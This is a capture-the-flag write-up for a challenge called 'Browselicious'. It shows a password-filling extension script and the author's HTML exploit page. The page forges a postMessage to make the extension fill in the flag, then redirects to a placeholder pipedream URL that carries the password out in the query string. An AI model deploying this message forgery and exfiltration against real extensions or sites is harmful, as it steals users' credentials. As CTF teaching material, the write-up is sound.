# Browselicious

Category: Misc (though it feels like a web challenge)

We are given a website that allows us to input a url, saying that "their browser extension is coming soon", and a `content.js`

```js
// Listen for messages from the extension
window.addEventListener("message", function (event) {
    // Check if the message is from the extension
    if (event.source === window && event.data.action === "populatePassword") {
        // Find the password input field
        var passwordField = document.querySelector('input[type="password"]');

        // Populate the password field with the specified string
        if (passwordField) {
            passwordField.value = (event.data.url === "http://flag") ? "BSidevTLV2023{TheFlag}" : "MyDefaultPassword";
        }
    }
});

// Send a message to populate the password field on page load
window.addEventListener("load", function () {
    window.postMessage({
        action: "populatePassword",
        url: window.location.href,
        password: "YourPassword" // Replace with the desired password
    }, "*");
});
```

I put two and two together and realized that we needed to make our own website for it to run the extension, dump the password to, and somehow get back the password

However, it has a check for the `event.data.url` to be `http://flag`. What I did though, was send *another* `window.postMessage()` with a forged `url` value to make it override the password field, then, grab the password value and send it to hookbin (now called pipedream, apparently).

This was the source code of the website:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <input type="password" name="" id="pw">
</body>
<script>
    const t = 1000
    function harvest() {
        const pw = document.getElementById('pw');
        window.location.href = "https://<pipedream url>?password=" + pw.value
    }
    function sned() {
        window.postMessage({
            action: "populatePassword",
            url: "http://flag",
            password: "ligma" // Doesnt even need to be here
        }, "*");
        setTimeout(harvest, t)
    }
    setTimeout(sned, t)
</script>
</html>
```

Side note: when testing, simply adding the extension js code into the `<script>` tags helped to "simulate" what the extension would do.

Flag: `BSidevTLV2023{G1v3M3Th3P4ssw0rd}`

